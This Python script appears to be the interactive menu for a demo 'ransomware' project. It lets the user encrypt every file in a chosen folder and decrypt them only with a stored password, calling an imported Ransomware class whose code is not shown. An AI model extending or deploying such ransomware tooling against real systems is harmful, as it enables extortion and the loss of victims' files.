from ransomware import Ransomware
import time
import getpass

white = "\033[97m"
green = "\033[92m"
red = "\033[91m"


def menu() -> int:
    print(f"\n{white}1. Encrypt files in folder")
    print(f"{white}2. Decrypt files in folder")
    print(f"{white}3. Exit")
    choice = int(input(f"{white}Enter choice: "))
    return choice


def input_password(string: str) -> str:
    password = getpass.getpass(string)
    return password


if __name__ == "__main__":
    ransomware = Ransomware()
    while True:
        choice = menu()
        if choice == 1:
            path = input(f"{white}Enter path: ")
            path = path.replace("\\", "\\\\")
            ransomware.encrypt_files_in_folder(path)
        elif choice == 2:
            path = input(f"{white}Enter path: ")
            path = path.replace("\\", "\\\\")
            password = input_password(
                f"{white}Enter password to decrypt files (password is hidden): "
            )
            if password != ransomware.password:
                print(f"\n{red}Invalid password!")
                exit(0)
            else:
                print(f"\n{green}Password is correct! Decrypting files...")
                time.sleep(2)

            ransomware.decrypt_files_in_folder(path)
        elif choice == 3:
            break
        else:
            print(f"\n{red}Invalid choice!")
